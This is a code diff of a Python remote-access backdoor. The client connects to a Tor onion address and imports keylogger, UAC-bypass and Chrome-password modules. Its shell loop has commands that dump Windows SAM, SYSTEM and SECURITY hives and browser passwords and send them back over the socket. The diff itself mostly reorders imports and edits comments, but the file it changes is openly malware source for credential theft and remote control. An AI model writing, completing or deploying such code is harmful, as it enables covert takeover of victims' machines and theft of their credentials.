@@ -7,23 +7,22 @@ import sys
 import threading
 from sys import platform
 from shutil import copyfile
+import requests
+from mss import mss
 
 #importing tor network
 from tor_network import ClientSocket, Tor
 
-# Related third party imports
-import requests
-from mss import mss
-
 # Local tools to the application
 from tools import keylogger,uac_bypass,chrome
 
+#constraints
+ENCODING = 'utf-8'
 
 
 def reliable_send(data):
     jsondata = json.dumps(data)
     s.send(jsondata.encode())
-
 
 def reliable_recv():
     data = ''
@@ -237,7 +236,7 @@ def shell():
                 reliable_send('[-] Failed to start!')
         
         
-        # TODO: Not yet to production level
+        #still error in chrome_pass
         elif command[:11] == 'chrome_pass':
             chrome_passwords()
 
@@ -245,6 +244,7 @@ def shell():
             sam_dump, system_dump, security_dump = get_sam_dump()
             reliable_send((sam_dump, system_dump, security_dump))
         
+        #Needed to be implemented
         elif command[:10] == 'uacbypass':
             if uac_bypass.execute():
                 reliable_send('[+] UAC bypassed!')
@@ -272,7 +272,6 @@ def connect():
             connect()
 
 tor = Tor()
-ENCODING = 'utf-8'
 onion, port = tor.read_address_from_binary()
 print('onion: ' + onion + '\nport: ' + str(port))
 
